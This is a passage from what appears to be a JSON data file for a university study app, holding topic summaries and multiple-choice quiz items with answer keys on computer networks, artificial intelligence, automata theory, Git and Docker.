              "plain": "CRC appends redundant bits calculated via binary modulo-2 polynomial division (XOR). If the receiver divides by the same generator and gets 0, no error occurred.",
              "def": "CRC uses a generator polynomial G(x) of degree r. Append r zeros to data M. Divide M * 2^r by G using XOR arithmetic. The remainder R is the CRC checksum appended to the frame.",
              "exam": "CRC detects all single-bit errors, double-bit errors, and burst errors of length <= r.",
              "trap": "Exam Trap: Modulo-2 arithmetic uses XOR operations without carries or borrows.",
              "example": "Ethernet FCS (Frame Check Sequence) uses CRC-32.",
              "q": "In CRC error detection, what arithmetic operation replaces standard binary subtraction during polynomial division?",
              "a": "Bitwise XOR (modulo-2 division without carries or borrows)."
            },
            {
              "id": "cn_sliding_window",
              "cat": "Data Link",
              "title": "SLIDING WINDOW: GO-BACK-N VS SELECTIVE REPEAT",
              "sub": "ARQ Flow & Error Control",
              "plain": "Stop-and-wait sends 1 frame and waits. Go-Back-N sends up to N frames; if frame k is lost, it resends all frames from k onward. Selective Repeat resends ONLY the lost frame.",
              "def": "Sliding Window protocols maximize channel utilization. Go-Back-N uses sender window N and receiver window 1 (discards out-of-order frames). Selective Repeat uses sender window N and receiver window N, buffering out-of-order frames.",
              "exam": "Go-Back-N receiver window = 1. Selective Repeat receiver window = N.",
              "trap": "Exam Trap: In Go-Back-N with m-bit sequence numbers, max window size is 2^m - 1 (not 2^m) to avoid sequence overlap!",
              "example": "Satellite links require large sliding windows due to high bandwidth-delay products.",
              "q": "What is the size of the receiver window in the Go-Back-N ARQ protocol?",
              "a": "1 (the receiver accepts only frames in strict sequential order and discards all out-of-order frames)."
            }
          ],
          "quiz": [
            {
              "q": "For an m-bit sequence number, what is the maximum sender window size in the Go-Back-N protocol to avoid ambiguity?",
              "opts": [
                "2^m",
                "2^m - 1",
                "2^(m-1)",
                "m"
              ],
              "ans": 1,
              "cat": "Data Link",
              "correctFb": "In Go-Back-N, the sender window size cannot exceed 2^m - 1 to prevent ambiguity between duplicate and new ACKs.",
              "distractors": [
                "2^m causes ambiguity.",
                "2^(m-1) is the window limit for Selective Repeat.",
                "m is the bit width."
              ]
            }
          ]
        },
        {
          "id": "m3",
          "num": 3,
          "title": "Network Layer, IPv4 & Routing",
          "topics": [
            {
              "id": "cn_subnetting",
              "cat": "Network Layer",
              "title": "IPV4 SUBNETTING & CIDR",
              "sub": "VLSM & Usable Hosts",
              "plain": "CIDR prefix /n specifies network bits. Usable hosts = 2^(32-n) - 2 (subtracting network and broadcast IDs).",
              "def": "Classless Inter-Domain Routing (CIDR) aggregates routes using arbitrary prefix masks. Host count calculation: 2^(32-n) - 2.",
              "exam": "Formula: Usable Hosts = 2^(32-n) - 2.",
              "trap": "Exam Trap: Always subtract 2 for usable hosts (all-0s is Network Address; all-1s is Broadcast).",
              "example": "A /26 subnet provides 32-26 = 6 host bits -> 64 total addresses, 62 usable hosts.",
              "q": "How many assignable host IP addresses exist in a 192.168.1.0/28 subnet?",
              "a": "Host bits = 32 - 28 = 4. 2^4 = 16. Usable = 16 - 2 = 14."
            },
            {
              "id": "cn_routing",
              "cat": "Routing",
              "title": "DISTANCE VECTOR VS LINK STATE ROUTING",
              "sub": "Bellman-Ford vs Dijkstra (RIP vs OSPF)",
              "plain": "Distance Vector: tells neighbors its distance to everyone (can suffer from Count-to-Infinity). Link State: tells everyone about its direct neighbors (builds full topology using Dijkstra).",
              "def": "Distance Vector (Bellman-Ford, RIP) periodically sends full routing table to immediate neighbors. Link State (Dijkstra, OSPF) floods link-state advertisements (LSAs) to the entire network to compute shortest paths.",
              "exam": "Distance Vector: Count-to-Infinity problem (solved via Split Horizon / Poison Reverse). Link State: Faster convergence, higher memory.",
              "trap": "Exam Trap: Distance Vector routes by rumor; Link State routers know the entire network graph independently.",
              "example": "OSPF is interior gateway link-state; BGP is path-vector exterior routing.",
              "q": "Which problem causes slow convergence and routing loops in Distance Vector routing protocols?",
              "a": "The Count-to-Infinity problem."
            }
          ],
          "quiz": [
            {
              "q": "Which shortest-path algorithm is used by Link State routing protocols like OSPF?",
              "opts": [
                "Bellman-Ford Algorithm",
                "Dijkstra's Algorithm",
                "Floyd-Warshall Algorithm",
                "Kruskal's Algorithm"
              ],
              "ans": 1,
              "cat": "Routing",
              "correctFb": "OSPF and Link State routing use Dijkstra's shortest-path algorithm to calculate least-cost paths.",
              "distractors": [
                "Bellman-Ford is used by Distance Vector (RIP).",
                "Floyd-Warshall finds all-pairs shortest paths.",
                "Kruskal is for Minimum Spanning Trees."
              ]
            }
          ]
        },
        {
          "id": "m4",
          "num": 4,
          "title": "Transport Layer",
          "topics": [
            {
              "id": "cn_tcp_handshake",
              "cat": "Transport",
              "title": "TCP 3-WAY HANDSHAKE & FLOW CONTROL",
              "sub": "SYN, SYN-ACK, ACK & Sliding Window",
              "plain": "TCP establishes reliable connection via 3 packets: Client sends SYN -> Server replies SYN-ACK -> Client sends ACK. Flow control uses Receive Window (rwnd) so fast senders do not overwhelm slow receivers.",
              "def": "TCP guarantees reliable in-order byte streams. Connection setup: 1) Client sends SYN with seq=x. 2) Server responds SYN-ACK with ack=x+1, seq=y. 3) Client sends ACK with ack=y+1. Flow control is receiver-driven using rwnd advertised in headers.",
              "exam": "Handshake packets: SYN -> SYN-ACK -> ACK. Flow control = Receiver buffer protection.",
              "trap": "Exam Trap: Flow control protects the RECEIVER buffer; Congestion control protects the intermediate NETWORK routers.",
              "example": "A client buffer filling up prompts the receiver to advertise rwnd=0, halting the sender.",
              "q": "What is the difference between TCP Flow Control and TCP Congestion Control?",
              "a": "Flow Control prevents the sender from overwhelming the receiver's buffer (rwnd). Congestion Control prevents the sender from overwhelming the intermediate network routers (cwnd)."
            },
            {
              "id": "cn_tcp_congestion",
              "cat": "Transport",
              "title": "TCP CONGESTION CONTROL",
              "sub": "Slow Start, Congestion Avoidance, Fast Retransmit",
              "plain": "TCP starts cautiously (Slow Start doubles cwnd exponentially). At ssthresh, it switches to linear growth (Congestion Avoidance). 3 duplicate ACKs trigger Fast Retransmit.",
              "def": "TCP Congestion Control phases: 1) Slow Start: cwnd starts at 1 MSS and doubles every RTT (exponential). 2) Congestion Avoidance: at ssthresh, cwnd increases by 1 MSS per RTT (linear). 3) Fast Retransmit: 3 duplicate ACKs trigger immediate retransmission before timeout. 4) Fast Recovery: halves ssthresh without dropping to 1.",
              "exam": "Slow Start is exponential (1, 2, 4, 8...). Congestion Avoidance is additive increase (AIMD).",
              "trap": "Exam Trap: On a timeout, Tahoe drops cwnd back to 1 MSS and sets ssthresh to cwnd/2. Reno uses Fast Recovery for 3 dup ACKs.",
              "example": "TCP Reno handling packet drops over congested transatlantic fiber links.",
              "q": "What triggers the Fast Retransmit mechanism in TCP before a retransmission timer expires?",
              "a": "The arrival of 3 duplicate ACKs for the same sequence number."
            }
          ],
          "quiz": [
            {
              "q": "During the TCP Slow Start phase, how does the congestion window (cwnd) increase upon receipt of each ACKed round-trip?",
              "opts": [
                "Linearly by 1 MSS",
                "Exponentially (doubling every RTT)",
                "Logarithmically",
                "It remains constant"
              ],
              "ans": 1,
              "cat": "Transport",
              "correctFb": "Slow Start increases cwnd exponentially (doubles each RTT) until the slow-start threshold (ssthresh) is reached.",
              "distractors": [
                "Linear increase occurs during Congestion Avoidance.",
                "Logarithmic is incorrect.",
                "Constant window occurs in flow control saturation."
              ]
            }
          ]
        },
        {
          "id": "m5",
          "num": 5,
          "title": "Application Layer and Network Security",
          "topics": [
            {
              "id": "cn_dns",
              "cat": "Application",
              "title": "DOMAIN NAME SYSTEM (DNS)",
              "sub": "Hierarchical Resolution & Resource Records",
              "plain": "The internet's phonebook. Maps human-friendly domain names (astu.ac.in) to machine IP addresses using hierarchical servers (Root -> TLD -> Authoritative).",
              "def": "DNS is an application-layer service over UDP/TCP port 53. Resolution hierarchy: 1) Root DNS servers, 2) Top-Level Domain (TLD) servers (.in, .com), 3) Authoritative DNS servers. Key records: A (IPv4), AAAA (IPv6), CNAME (canonical alias), MX (mail exchange), NS (name server).",
              "exam": "DNS typically uses UDP port 53 for fast queries; uses TCP port 53 for zone transfers or responses > 512 bytes.",
              "trap": "Exam Trap: Recursive query asks server to resolve completely; Iterative query returns referral to next DNS server in chain.",
              "example": "Typing a URL triggers recursive resolver querying Root, TLD, and authoritative nameservers.",
              "q": "Why does DNS predominantly use UDP port 53 rather than TCP for standard client lookups?",
              "a": "UDP has zero connection setup overhead (no 3-way handshake), providing low-latency resolution for small single-packet queries."
            }
          ],
          "quiz": [
            {
              "q": "Which DNS Resource Record (RR) maps a domain hostname to an IPv6 address?",
              "opts": [
                "A Record",
                "AAAA Record",
                "CNAME Record",
                "PTR Record"
              ],
              "ans": 1,
              "cat": "Application",
              "correctFb": "AAAA records map domain names to 128-bit IPv6 addresses (whereas A records map to 32-bit IPv4).",
              "distractors": [
                "A Record is IPv4.",
                "CNAME is an alias.",
                "PTR is reverse DNS lookup."
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "ai",
      "code": "CS241501",
      "title": "Artificial Intelligence",
      "icon": "\ud83e\udd16",
      "modules": [
        {
          "id": "m1",
          "num": 1,
          "title": "Intelligent Agents & Problem Formulation",
          "topics": [
            {
              "id": "ai_agents_peas",
              "cat": "Agents",
              "title": "INTELLIGENT AGENTS & PEAS",
              "sub": "Performance, Environment, Actuators, Sensors",
              "plain": "An agent perceives via sensors and acts via actuators. PEAS specifies: Performance measure (score), Environment (world), Actuators (outputs), Sensors (inputs).",
              "def": "An intelligent agent operates autonomously to achieve goals. 4 Agent types: Simple reflex (condition-action), Model-based (maintains internal state), Goal-based (acts to reach goals), Utility-based (maximizes happiness/utility). PEAS defines the problem specification.",
              "exam": "PEAS: Performance Measure, Environment, Actuators, Sensors.",
              "trap": "Exam Trap: Rationality != Omniscience. Rationality maximizes EXPECTED performance given past percepts, not perfect future knowledge.",
              "example": "Medical diagnosis system: P = healthy patient, E = symptoms/tests, A = display diagnosis, S = keyboard/test data.",
              "q": "What is the key difference between a Simple Reflex Agent and a Model-Based Reflex Agent?",
              "a": "Simple Reflex agents react only to current percepts. Model-Based agents maintain internal state to track unobserved parts of the environment."
            }
          ],
          "quiz": [
            {
              "q": "Which agent architecture maintains an internal state to handle partially observable environments?",
              "opts": [
                "Simple Reflex Agent",
                "Model-Based Reflex Agent",
                "Table-Driven Agent",
                "Pure Reactive Agent"
              ],
              "ans": 1,
              "cat": "Agents",
              "correctFb": "Model-based reflex agents keep track of the world state using an internal model of how the environment evolves.",
              "distractors": [
                "Simple reflex ignores history.",
                "Table-driven is completely impractical.",
                "Pure reactive has no memory."
              ]
            }
          ]
        },
        {
          "id": "m2",
          "num": 2,
          "title": "Search Techniques",
          "topics": [
            {
              "id": "ai_astar",
              "cat": "Search",
              "title": "A* SEARCH & HEURISTICS",
              "sub": "Admissibility & Consistency",
              "plain": "A* searches the best path using f(n) = g(n) + h(n). g(n) is the cost so far; h(n) is the estimated cost to the goal. If h(n) never overestimates (admissible), A* is optimal!",
              "def": "A* is an informed search algorithm evaluating f(n) = g(n) + h(n). Admissible heuristic: h(n) <= h*(n) (never overestimates true cost). Consistent heuristic: h(n) <= c(n, a, n') + h(n') (satisfies triangle inequality).",
              "exam": "A* is complete and optimal if heuristic h(n) is admissible (for tree search) and consistent (for graph search).",
              "trap": "Exam Trap: If h(n) = 0 for all nodes, A* degrades into Dijkstra / Uniform Cost Search (UCS).",
              "example": "GPS navigation computing shortest driving route using straight-line Euclidean distance as h(n).",
              "q": "What condition must a heuristic function h(n) satisfy to guarantee that tree-search A* is optimal?",
              "a": "Admissibility: h(n) must never overestimate the true minimum cost to reach the goal (h(n) <= h*(n))."
            }
          ],
          "quiz": [
            {
              "q": "What happens to the A* search algorithm if the heuristic evaluation function h(n) is set to 0 for all nodes?",
              "opts": [
                "It becomes Breadth-First Search (BFS)",
                "It degrades into Uniform Cost Search (Dijkstra)",
                "It becomes Greedy Best-First Search",
                "It fails to find any solution"
              ],
              "ans": 1,
              "cat": "Search",
              "correctFb": "When h(n) = 0, f(n) = g(n), which evaluates purely based on path cost from the start node (Uniform Cost Search).",
              "distractors": [
                "BFS assumes all step costs are equal.",
                "Greedy search only uses h(n).",
                "It still finds the optimal path."
              ]
            }
          ]
        },
        {
          "id": "m3",
          "num": 3,
          "title": "Knowledge Representation and Reasoning",
          "topics": [
            {
              "id": "ai_resolution",
              "cat": "Logic",
              "title": "PROPOSITIONAL LOGIC & RESOLUTION",
              "sub": "CNF & Proof by Contradiction",
              "plain": "To prove knowledge KB entails alpha, negate alpha (not alpha), add to KB, convert to Conjunctive Normal Form (CNF), and resolve clauses. If you reach an empty clause (False), the theorem is proven!",
              "def": "Resolution is an inference rule for Conjunctive Normal Form (CNF): (A v B) and (~B v C) yields (A v C). Resolution refutation proves KB |= alpha by demonstrating that KB and ~alpha is unsatisfiable (deriving the empty clause box).",
              "exam": "Resolution refutation is sound and refutation-complete for propositional and first-order logic.",
              "trap": "Exam Trap: You must negate the goal query when setting up a resolution proof by contradiction.",
              "example": "Automated theorem proving in expert systems.",
              "q": "What rule of inference resolves the clauses (P v Q) and (~P v R)?",
              "a": "The Resolution Rule, yielding the resolvent clause (Q v R)."
            }
          ],
          "quiz": [
            {
              "q": "In resolution refutation proofs in artificial intelligence, what does deriving the empty clause (box) signify?",
              "opts": [
                "The knowledge base is incomplete",
                "A contradiction is reached, proving the original query",
                "The query is undecidable",
                "The search algorithm looped indefinitely"
              ],
              "ans": 1,
              "cat": "Logic",
              "correctFb": "Deriving the empty clause proves that KB and ~alpha is unsatisfiable (a contradiction), confirming KB |= alpha.",
              "distractors": [
                "Incompleteness is false.",
                "Undecidability is not signaled by an empty clause.",
                "Looping does not produce an empty clause."
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "flat",
      "code": "CS241504",
      "title": "Formal Language & Automata",
      "icon": "\u26a1",
      "modules": [
        {
          "id": "m1",
          "num": 1,
          "title": "Finite Automata and Regular Languages",
          "topics": [
            {
              "id": "flat_dfa_5tuple",
              "cat": "Automata",
              "title": "DETERMINISTIC FINITE AUTOMATA (DFA)",
              "sub": "5-Tuple Formal Definition",
              "plain": "A DFA is a state machine with no memory other than its current state. For every state and input symbol, there is exactly one guaranteed next state transition.",
              "def": "A DFA is a 5-tuple M = (Q, Sigma, delta, q0, F) where: Q is finite set of states, Sigma is finite alphabet, delta: Q x Sigma -> Q is transition function, q0 in Q is initial state, and F subset of Q is accept states.",
              "exam": "5-Tuple: (Q, Sigma, delta, q0, F). delta(q, a) maps to EXACTLY ONE state.",
              "trap": "Exam Trap: DFA transition delta must be defined for EVERY alphabet symbol in EVERY state.",
              "example": "Lexical analyzers in compilers (lex/flex) recognizing tokens using DFAs.",
              "q": "What is the formal mathematical signature of the transition function delta in a DFA?",
              "a": "delta: Q x Sigma -> Q."
            },
            {
              "id": "flat_nfa_equiv",
              "cat": "Automata",
              "title": "NFA TO DFA EQUIVALENCE",
              "sub": "Subset Construction (Power Set)",
              "plain": "An NFA can branch to multiple states or take epsilon transitions. Every NFA can be converted to an equivalent DFA using the Subset Construction algorithm.",
              "def": "Non-Deterministic Finite Automata have delta: Q x (Sigma U {epsilon}) -> 2^Q. Every NFA has an equivalent DFA recognizing the exact same regular language. A DFA converted from an NFA with n states has at most 2^n states.",
              "exam": "Power set construction: Max states in equivalent DFA = 2^n for an n-state NFA.",
              "trap": "Exam Trap: NFAs are NOT more powerful than DFAs! Both recognize the exact same class of Regular Languages.",
              "example": "Regular expression pattern matching engine compiling regex to NFA, then subset-constructing to DFA.",
              "q": "If an NFA has n states, what is the theoretical maximum number of states in its equivalent minimized DFA?",
              "a": "2^n states (the power set of NFA states)."
            }
          ],
          "quiz": [
            {
              "q": "Does a Non-Deterministic Finite Automaton (NFA) possess greater language-recognizing power than a Deterministic Finite Automaton (DFA)?",
              "opts": [
                "Yes, NFAs can recognize context-free languages",
                "No, NFAs and DFAs recognize the exact same class of Regular Languages",
                "Yes, because of epsilon transitions",
                "No, DFAs are strictly more powerful than NFAs"
              ],
              "ans": 1,
              "cat": "Automata",
              "correctFb": "NFAs and DFAs have identical computational power; both recognize precisely the regular languages.",
              "distractors": [
                "Neither recognizes non-regular CFLs.",
                "Epsilon transitions do not add expressive power.",
                "DFAs are not strictly more powerful."
              ]
            }
          ]
        },
        {
          "id": "m2",
          "num": 2,
          "title": "Regular Expressions and Properties",
          "topics": [
            {
              "id": "flat_pumping_lemma",
              "cat": "Regular Languages",
              "title": "PUMPING LEMMA FOR REGULAR LANGUAGES",
              "sub": "Proving Non-Regularity",
              "plain": "If a language is regular, any sufficiently long string s (length >= p) can be split into xyz such that y can be 'pumped' (repeated) any number of times (xy^i z) and still remain in the language. Used to prove languages are NOT regular!",
              "def": "Pumping Lemma: For regular language L, there exists pumping length p such that any s in L with |s| >= p can be split into s = xyz where: 1) |y| > 0, 2) |xy| <= p, 3) for all i >= 0, xy^i z in L. Used via proof by contradiction to demonstrate non-regularity.",
              "exam": "Pumping Lemma CANNOT prove a language IS regular! It is only used to prove a language is NOT regular.",
              "trap": "Exam Trap: Never use Pumping Lemma to prove regularity. It is strictly an adversarial contradiction tool.",
              "example": "Proving L = {a^n b^n | n >= 0} is non-regular (pumping breaks equal counts of a and b).",
              "q": "What is the primary purpose of the Pumping Lemma for Regular Languages?",
              "a": "To prove that a given language is NOT regular by contradiction."
            }
          ],
          "quiz": [
            {
              "q": "Which condition is NOT a requirement of the Pumping Lemma for regular languages s = xyz?",
              "opts": [
                "|y| > 0",
                "|xy| <= p",
                "for all i >= 0, xy^i z in L",
                "|z| <= p"
              ],
              "ans": 3,
              "cat": "Regular Languages",
              "correctFb": "There is no constraint on the length of z (|z| <= p). The constraints are |y| > 0 and |xy| <= p.",
              "distractors": [
                "|y| > 0 is mandatory.",
                "|xy| <= p is mandatory.",
                "xy^i z in L is mandatory."
              ]
            }
          ]
        },
        {
          "id": "m4",
          "num": 4,
          "title": "Turing Machines and Computability",
          "topics": [
            {
              "id": "flat_turing_machine",
              "cat": "Computability",
              "title": "TURING MACHINE 7-TUPLE",
              "sub": "Infinite Tape & Church-Turing Thesis",
              "plain": "A Turing machine has a state machine with a read/write head moving left or right across an infinite tape. It defines what is computable by any computer ever built.",
              "def": "A Turing Machine is a 7-tuple M = (Q, Sigma, Gamma, delta, q0, qaccept, qreject) where Gamma is tape alphabet (Sigma subset of Gamma, blank in Gamma - Sigma), and delta: Q x Gamma -> Q x Gamma x {L, R}. The Church-Turing thesis asserts that any algorithmic computation can be performed by a Turing Machine.",
              "exam": "7-Tuple: (Q, Sigma, Gamma, delta, q0, qaccept, qreject). Tape is infinite.",
              "trap": "Exam Trap: A TM halts and accepts in qaccept; halts and rejects in qreject; or loops forever (does not halt).",
              "example": "Deciding palindromes or simulating general-purpose CPU instructions.",
              "q": "What is the signature of the transition function delta in a standard Deterministic Turing Machine?",
              "a": "delta: Q x Gamma -> Q x Gamma x {L, R}."
            }
          ],
          "quiz": [
            {
              "q": "According to the Church-Turing thesis, what is the universal bound of effective algorithmic computation?",
              "opts": [
                "Any computable function can be computed by a Turing Machine",
                "Turing machines can solve the Halting Problem",
                "DFAs are equivalent in power to Turing Machines",
                "Quantum computers violate all Turing limits"
              ],
              "ans": 0,
              "cat": "Computability",
              "correctFb": "The Church-Turing thesis states that anything computable by any physical or theoretical algorithm can be computed by a Turing Machine.",
              "distractors": [
                "The Halting Problem is undecidable by TMs.",
                "DFAs are strictly less powerful than TMs.",
                "Quantum computers do not expand computability classes."
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "devops",
      "code": "CS241513",
      "title": "Software DevOps & Automation",
      "icon": "\ud83d\ude80",
      "modules": [
        {
          "id": "m1",
          "num": 1,
          "title": "Version Control Systems (Git)",
          "topics": [
            {
              "id": "devops_git_flow",
              "cat": "VCS",
              "title": "GIT WORKFLOWS & MERGING",
              "sub": "Fast-Forward vs 3-Way Merge & Rebase",
              "plain": "Git tracks directed acyclic graphs of commits. Merging combines branches. A Fast-Forward merge just moves the branch pointer. A 3-Way merge creates a merge commit with 2 parents.",
              "def": "Git is a distributed version control system. Fast-Forward merge occurs when target branch has no divergent commits. 3-Way merge finds the Common Ancestor (base) and resolves changes between branch tips. Git rebase replays commits on top of another base.",
              "exam": "Fast-Forward: No extra commit. 3-Way Merge: Creates a dedicated merge commit with two parent hashes.",
              "trap": "Exam Trap: Never rebase commits that have already been pushed to a shared public branch (it rewrites history).",
              "example": "Feature-branch workflow with GitHub pull requests.",
              "q": "Under what condition can Git perform a Fast-Forward merge?",
              "a": "When the target branch tip has no divergent commits and is a direct ancestor of the branch being merged."
            }
          ],
          "quiz": [
            {
              "q": "Which Git command rewrites commit history by transplanting a series of commits on top of a new base commit?",
              "opts": [
                "git merge",
                "git rebase",
                "git checkout",
                "git stash"
              ],
              "ans": 1,
              "cat": "VCS",
              "correctFb": "git rebase reapplies commits on top of another base tip, creating a linear history.",
              "distractors": [
                "git merge creates a merge commit.",
                "checkout switches branches.",
                "stash saves uncommitted changes."
              ]
            }
          ]
        },
        {
          "id": "m3",
          "num": 3,
          "title": "Containerization Fundamentals (Docker)",
          "topics": [
            {
              "id": "devops_docker",
              "cat": "Containers",
              "title": "DOCKER ARCHITECTURE & DOCKERFILES",
              "sub": "Namespaces, cgroups & Layer Caching",
              "plain": "Containers are isolated Linux processes sharing the host kernel using namespaces (isolation) and cgroups (resource limits). Dockerfiles build read-only layered images.",
              "def": "Docker uses Linux kernel primitives: Namespaces (PID, NET, MNT, IPC, UTS) for process isolation, and Control Groups (cgroups) for CPU/memory resource limits. Docker images are read-only stacks of UnionFS layers.",
              "exam": "Containers share host kernel (lightweight). VMs use a hypervisor and run complete guest operating systems (heavyweight).",
              "trap": "Exam Trap: Order matters in Dockerfiles! Put frequently changing lines (like COPY . .) at the bottom to maximize build layer caching.",
              "example": "Deploying microservices in multi-stage Alpine Docker images.",
              "q": "Which Linux kernel feature provides resource metering and limits (such as capping memory or CPU cores) for Docker containers?",
              "a": "Control Groups (cgroups)."
            }
          ],
          "quiz": [
            {
              "q": "What is the primary difference between a Docker container and a traditional Hardware Virtual Machine (VM)?",
              "opts": [
                "Containers share the host OS kernel; VMs run separate guest OS kernels via a hypervisor",
                "VMs are lighter and boot faster than containers",
                "Containers do not support networking",
                "Containers require dedicated BIOS firmware"
              ],
              "ans": 0,
              "cat": "Containers",
              "correctFb": "Containers share the host kernel via namespaces and cgroups, making them fast and lightweight compared to full guest OS hypervisor VMs.",
              "distractors": [
                "Containers boot much faster than VMs.",
                "Containers have full virtual networking.",
                "Containers do not use virtual BIOS."
              ]
            }
          ]
        }
      ]
    }
  ]
};
